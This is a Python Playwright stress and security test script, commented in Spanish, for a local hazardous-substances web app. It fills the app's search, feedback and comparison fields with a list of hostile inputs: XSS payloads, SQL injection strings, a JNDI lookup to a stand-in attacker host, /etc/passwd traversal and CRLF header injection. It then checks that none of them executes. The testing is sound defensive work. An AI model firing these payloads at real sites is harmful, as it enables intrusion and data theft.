#!/usr/bin/env python3
"""Batería de pruebas de estrés y seguridad (20 rondas).

Simula un usuario malicioso: inyecciones, Unicode hostil, carreras,
intento de ejecución de scripts, manipulación del tema y del almacenamiento.
No modifica la aplicación; solo reporta hallazgos.
"""
import os
import sys
import time
from playwright.sync_api import sync_playwright

URL = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8766/sustancias-peligrosas/"
RONDAS = int(sys.argv[2]) if len(sys.argv) > 2 else 20

VECTORES = [
    "<script>window.__pwned=1</script>",
    "<img src=x onerror=window.__pwned=1>",
    "'; DROP TABLE substances; --",
    "{{7*7}} ${jndi:ldap://atacante/x}",
    "H2SO4" * 500,
    "中文😀🔬🧪" * 50,
    "\x00\x01\x02\x03admin",
    "../../../etc/passwd",
    "javascript:alert(1)",
    "A" * 20000,
    "áéíóúñ" * 300,
    "https://evil.example/?q=<script>",
    "onmouseover=alert(1)",
    "</style><script>window.__pwned=1</script>",
    "%00%0d%0aSet-Cookie:%20sid=evil",
    "̴̶̷̵Zalgo̴̶̷̵",
    "组织领导" * 20,
    "urn:x;alert(1)//",
    "SELECT * FROM users WHERE 1=1--",
    "😀" * 500,
    "<svg/onload=window.__pwned=1>",
    "<iframe src=javascript:alert(1)>",
    "<form action=javascript:alert(1)><input name=q>",
    "data:text/html,<script>window.__pwned=1</script>",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
]

HALLAZGOS = []


def chk(ronda, nombre, ok, detalle=""):
    if not ok:
        HALLAZGOS.append((ronda, nombre, detalle))
        print(f"  [R{ronda:02d}] FALLO {nombre}: {str(detalle)[:100]}")


with sync_playwright() as p:
    navegador = p.firefox.launch(headless=True)
    for ronda in range(1, RONDAS + 1):
        vector = VECTORES[(ronda - 1) % len(VECTORES)]
        ctx = navegador.new_context(viewport={"width": 1280, "height": 800})
        page = ctx.new_page()
        errores = []
        dialogos = []
        page.on("pageerror", lambda e: errores.append(str(e)))
        page.on("dialog", lambda d: (dialogos.append(d.message), d.dismiss()))
        try:
            page.goto(URL, wait_until="domcontentloaded", timeout=60000)
            page.locator(".continente-carpeta").first.wait_for(timeout=60000)
        except Exception as e:
            chk(ronda, "carga", False, str(e)[:80])
            ctx.close()
            continue

        # 1) CSP: no debe ejecutarse script inyectado
        chk(ronda, "CSP bloquea script", page.evaluate("typeof window.__pwned === 'undefined'"))

        # 2) Seleccionar pais
        eu = page.locator(".continente-carpeta", has_text="EUROPA")
        eu.locator("summary").click()
        eu.locator(".pais-boton", has_text="España").first.click()
        page.wait_for_timeout(200)

        # 3) Inyeccion en buscador
        inp = page.locator("input[placeholder*='Acetona']").first
        inp.fill(vector)
        page.wait_for_timeout(1500)
        chk(ronda, "sin ejecucion buscador", page.evaluate("typeof window.__pwned === 'undefined'"))

        # 4) Inyeccion en feedback
        if page.locator(".feedback-panel summary").count():
            page.locator(".feedback-panel summary").click()
            page.wait_for_timeout(100)
            campo = page.locator(".feedback-panel input[type=text]")
            try:
                campo.wait_for(state="visible", timeout=8000)
                campo.fill(vector)
                esperado = "".join(c for c in vector[:30] if ord(c) >= 32)
                chk(ronda, "feedback conserva texto", esperado in campo.input_value())
            except Exception:
                chk(ronda, "panel feedback accesible", False, "no se pudo abrir")

        # 5) Inyeccion en comparador
        multi = page.locator(".multi-anadir input")
        if multi.count():
            multi.fill(vector)
            anadir = page.locator('button:has-text("Añadir")')
            if anadir.count():
                anadir.click()
                page.wait_for_timeout(100)
        chk(ronda, "sin ejecucion comparador", page.evaluate("typeof window.__pwned === 'undefined'"))

        # 6) Manipulacion de tema y almacenamiento
        page.evaluate("localStorage.setItem('sustancias-theme','<script>window.__pwned=1</script>')")
        try:
            page.evaluate("for(let i=0;i<5000;i++)localStorage.setItem('relleno'+i,'x'.repeat(400))")
        except Exception:
            pass
        page.reload(wait_until="domcontentloaded")
        page.wait_for_timeout(1000)
        chk(ronda, "tema con valor malicious", page.evaluate("typeof window.__pwned === 'undefined'"))

        # 7) Carrera de busquedas
        for i in range(12):
            inp.fill(f"test{i}{vector[:5]}")
        page.wait_for_timeout(2000)
        chk(ronda, "sin errores tras carrera", len(errores) == 0, errores[:1])

        # 8) Sin dialogos de alert
        chk(ronda, "sin dialogos", len(dialogos) == 0, dialogos[:1])

        # 9) Sin desbordamiento
        chk(ronda, "sin overflow", not page.evaluate(
            "document.documentElement.scrollWidth > window.innerWidth + 3"))

        ctx.close()
        if ronda % 5 == 0:
            print(f"  ... {ronda}/{RONDAS} rondas completadas")

    navegador.close()

print(f"\nTOTAL HALLAZGOS: {len(HALLAZGOS)} de {RONDAS} rondas")
for r, n, d in HALLAZGOS[:15]:
    print(f"  R{r:02d} {n}: {d}")
sys.exit(1 if HALLAZGOS else 0)
